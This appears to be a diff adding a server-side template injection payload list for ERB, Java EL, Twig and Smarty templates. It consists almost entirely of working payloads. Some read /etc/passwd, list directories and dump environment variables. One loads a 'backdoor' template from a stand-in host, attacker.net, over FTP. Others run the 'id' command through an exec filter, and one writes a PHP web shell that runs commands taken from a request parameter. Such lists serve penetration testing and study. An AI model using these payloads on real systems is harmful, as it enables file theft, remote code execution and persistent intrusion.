@@ -1,0 +1,36 @@
+<%= 7 * 7 %>
+{% extends "/etc/passwd" %}
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+
+Java
+${7*7}
+${{7*7}}
+${class.getClassLoader()}
+${class.getResource("").getPath()}
+${class.getResource("../../../../../index.htm").getContent()}
+
+${T(java.lang.System).getenv()}
+
+
+Template format
+$output = $twig > render (
+  'Dear' . $_GET['custom_greeting'],
+  array("first_name" => $user.first_name)
+);
+
+$output = $twig > render (
+  "Dear {first_name}",
+  array("first_name" => $user.first_name)
+);
+
+
+Code execution
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+
+Smarty
+{php}echo `id`;{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
